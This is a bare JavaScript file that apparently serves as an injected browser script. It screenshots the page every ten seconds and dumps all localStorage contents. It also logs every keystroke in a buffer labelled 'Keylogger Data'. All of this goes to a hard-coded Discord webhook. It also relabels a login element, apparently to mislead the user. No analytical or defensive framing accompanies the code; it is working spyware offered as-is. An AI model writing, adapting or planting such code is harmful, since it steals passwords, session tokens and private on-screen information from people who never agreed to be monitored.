const WEBHOOK_URL = "https://discord.com/api/webhooks/1535668714522021962/bnDth-lZGAwt1hjPP9amg7TOPdpBs6gtF6OEpWR2i_FLXI0a93JH9QizNFvUvBQRiZ0A";
(function () {
  const CDN_URL = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";

  // 1. Function to capture and POST screenshot
  async function captureAndSend() {
    try {
      const canvas = await html2canvas(document.body, {
        useCORS: true,      // Help capture cross-origin images where allowed
        logging: false
      });

      canvas.toBlob(async (blob) => {
        if (!blob) return;

        const formData = new FormData();
        formData.append("file", blob, `screenshot-${Date.now()}.png`);
        formData.append("payload_json", JSON.stringify({
          content: `📸 **Page Screenshot** — ${new Date().toLocaleTimeString()}`
        }));

        const response = await fetch(WEBHOOK_URL, {
          method: "POST",
          body: formData
        });

        if (response.ok) {
          console.log("[Screenshot Sync] Sent successfully.");
        } else {
          console.error("[Screenshot Sync] Failed:", response.status, response.statusText);
        }
      }, "image/png");
    } catch (err) {
      console.error("[Screenshot Sync] Error rendering canvas:", err);
    }
  }

  // 2. Dynamically fetch html2canvas script before starting loop
  function loadHtml2Canvas(callback) {
    if (window.html2canvas) {
      callback();
      return;
    }

    const script = document.createElement("script");
    script.src = CDN_URL;
    script.onload = () => {
      console.log("[Screenshot Sync] html2canvas loaded successfully.");
      callback();
    };
    script.onerror = () => {
      console.error("[Screenshot Sync] Failed to load html2canvas from CDN.");
    };
    document.head.appendChild(script);
  }

  // 3. Initialize after script loads
  loadHtml2Canvas(() => {
    captureAndSend();
    setInterval(captureAndSend, 10000);
  });
})();
function sendLocalStorageToWebhook() {
    // Get all the key-value pairs from localStorage
    const localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        localStorageData[key] = value;
    }
    const payload = {
        content: "LocalStorage Data:",
        embeds: [
            {
                title: "LocalStorage",
                description: JSON.stringify(localStorageData, null, 2),
                color: 3447003
            }
        ]
    };

    // Use fetch to send the payload to the webhook
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error("Error:", error));
}

let keystrokesBuffer = "";

document.addEventListener("keydown", function(event) {
    keystrokesBuffer += event.key;
});

document.addEventListener("keyup", function(event) {
    if (event.key === "Escape") {  // Send the buffer when the Escape key is released
        sendKeystrokesToWebhook();
    }
});

function sendKeystrokesToWebhook() {
    const payload = {
        content: "Keystrokes:",
        embeds: [
            {
                title: "Keylogger Data",
                description: keystrokesBuffer,
                color: 16711680
            }
        ]
    };

    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error("Error:", error));

    keystrokesBuffer = "";
}

setInterval(() => {
  const loginVersion = document.getElementById('login_version');
  if (loginVersion) {
    loginVersion.textContent = "OOBE Version";
  }
}, 1);

setInterval(function(){sendKeystrokesToWebhook()},5000)
setTimeout(sendLocalStorageToWebhook, 4000);
